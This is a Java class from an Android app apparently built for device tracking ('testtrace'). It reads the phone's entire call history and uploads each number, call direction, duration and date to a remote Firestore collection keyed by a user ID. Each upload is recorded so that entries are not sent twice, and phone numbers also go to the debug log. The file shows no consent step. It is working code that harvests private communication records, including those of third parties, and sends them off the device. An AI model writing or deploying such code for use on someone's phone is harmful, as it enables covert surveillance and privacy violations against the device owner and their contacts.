package com.reiserx.testtrace.Operations;

import static android.content.ContentValues.TAG;
import static android.content.Context.MODE_PRIVATE;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.reiserx.testtrace.Classes.ExceptionHandler;
import com.reiserx.testtrace.Models.callLogs;

import java.util.Calendar;

public class getCallLogs {

    Context context;
    FirebaseDatabase mdb;
    String UserID, value;
    callLogs Logs;
    FirebaseFirestore firestore;

    public getCallLogs(Context context, FirebaseDatabase mdb, String userID, String value, FirebaseFirestore firestore) {
        this.context = context;
        this.mdb = mdb;
        this.UserID = userID;
        this.value = value;
        this.firestore = firestore;
    }

    public void getLogs() {
        try {
            if (value==null) {
                Notexists();
            } else {
                exists(Long.parseLong(value));
            }
        } catch(Exception e) {
            ExceptionHandler exceptionHandler = new ExceptionHandler(e, UserID);
            exceptionHandler.upload();
        }
    }

    public void exists(long time) {
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Calendar calendar = Calendar.getInstance();
        Calendar calendar1 = Calendar.getInstance();

        calendar.setTimeInMillis(time);
        String fromDate = String.valueOf(calendar.getTimeInMillis());
        String toDate = String.valueOf(calendar1.getTimeInMillis());
        String[] whereValue = {fromDate,toDate};

        // Initializes an array to contain selection arguments

        Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, android.provider.CallLog.Calls.DATE+" BETWEEN ? AND ?", whereValue, strOrder);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int id = managedCursor.getColumnIndex(CallLog.Calls._ID);

        SharedPreferences save = context.getSharedPreferences("CallLogs", MODE_PRIVATE);
        SharedPreferences.Editor myEdit = save.edit();
        String callDate;

        CollectionReference document = firestore.collection("Main").document(UserID).collection("Call Logs");


        while (managedCursor.moveToNext()) {

            String ids = managedCursor.getString(id);
            if (save.getString(ids, "").equals("")) {
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                callDate = managedCursor.getString(date);
                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);

                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                Log.d("calldetailssss", phNumber);
                Logs = new callLogs(phNumber, dir, callDuration, callDate);
                document.add(Logs)
                        .addOnSuccessListener(documentReference -> Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.getId()))
                        .addOnFailureListener(e -> Log.w(TAG, "Error adding document", e));
                myEdit.putString(ids, ids);
                myEdit.apply();
            }
        }
        managedCursor.close();
    }

    public void Notexists() {

        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int id = managedCursor.getColumnIndex(CallLog.Calls._ID);

        SharedPreferences save = context.getSharedPreferences("CallLogs", MODE_PRIVATE);
        SharedPreferences.Editor myEdit = save.edit();
        String callDate;

        CollectionReference document = firestore.collection("Main").document(UserID).collection("Call Logs");


        while (managedCursor.moveToNext()) {

            String ids = managedCursor.getString(id);
            if (save.getString(ids, "").equals("")) {
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                callDate = managedCursor.getString(date);
                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);

                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                Log.d("calldetailssss", phNumber);
                Logs = new callLogs(phNumber, dir, callDuration, callDate);
                document.add(Logs)
                        .addOnSuccessListener(documentReference -> Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.getId()))
                        .addOnFailureListener(e -> Log.w(TAG, "Error adding document", e));
                myEdit.putString(ids, ids);
                myEdit.apply();
            }
        }
        managedCursor.close();
    }
}
